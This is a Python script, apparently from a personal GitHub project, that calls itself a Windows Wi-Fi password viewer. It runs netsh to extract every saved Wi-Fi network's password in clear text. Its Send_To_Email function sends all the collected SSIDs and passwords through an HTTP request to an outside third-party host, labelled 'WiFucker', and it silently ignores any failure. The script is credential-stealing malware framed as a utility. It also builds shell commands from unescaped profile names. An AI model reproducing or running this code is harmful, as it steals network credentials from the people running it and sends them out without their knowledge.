# Wifi password is build by 'Protan Halder'
# This wifi pass viewer is works in only Windows PC

#  https://github.com/protan2206


# importing modules
import os
import requests

info = "Module is built by Protan Halder\nGithub : https://github.com/protan2206\nEmail : protanhalder2021@gmail.com\n\n"

#colours used
red = '\033[31m'
yellow = '\033[93m'
lgreen = '\033[92m'
clear = '\033[0m'
bold = '\033[01m'
cyan = '\033[96m'
purple = '\033[95m'
Bwhite = '\033[97m'
blue = '\033[94m'
gray = '\033[90m'


# this function returns all wifi profile names
def GET_SSID():
    # getting all data form wifi using windows CMD comands
    os.system("netsh wlan show profiles > SSID.txt")
    profile_name = []
    with open("SSID.txt" , "r") as file:
        profiles = file.readlines()
        for profile in profiles:
            if "All User Profile" in profile:
                name = profile.split(":")[1].replace("\n","")[1:]
                profile_name.append(name)
    os.remove("SSID.txt")
    return profile_name
         
         
        
    
# this function returns all passwords with SSID
def GET_WIFI_PASS():
    All_profile = (GET_SSID())
    SSID_AND_PASS = []
    for profile in All_profile:
        # getting All data of wifi using Windows CMD comands
        os.system(f'netsh wlan show profile name="{profile}" key="clear" > WifiPass.txt')
        
        with open("WifiPass.txt", "r") as file: 
            data = file.readlines()
            wifi = ""
            for i in data:
                if "SSID name" in i:
                    wifi += i.replace("\n" ,"" ).replace(",","")
                if "Key Content" in i:
                    wifi += i.replace("\n" ,"" ).replace(",","")
            Name_Pass = (wifi.split(":"))
            SSID_PASS = (f'''SSID :{Name_Pass[1].split('"')[1]} Pass :{Name_Pass[2]}''')
            SSID_AND_PASS.append(SSID_PASS)
    os.remove("WifiPass.txt")
    return SSID_AND_PASS

def Send_To_Email(pwd):
    try:
        with open("ToEmail.txt","r") as mail : 
            to = mail.readline()
        res = requests.get(f"https://email-pranks.000webhostapp.com/gmail.php?from=WifiPassword.wifucker.com&to={to}&subject=WiFucker&message={pwd}")
        if (res.status_code) == 200:
            print(cyan+f"[+] Passwords Sent to {to}\n")
    except:
        pass
    
    
if __name__ == "__main__":
    wifi_pass = GET_WIFI_PASS()
    pwd = ""
    print(cyan+info)
    for i in wifi_pass:
        pwd +=i+" | "
        print(cyan+ lgreen+ "[+] "+i )
    Send_To_Email(pwd)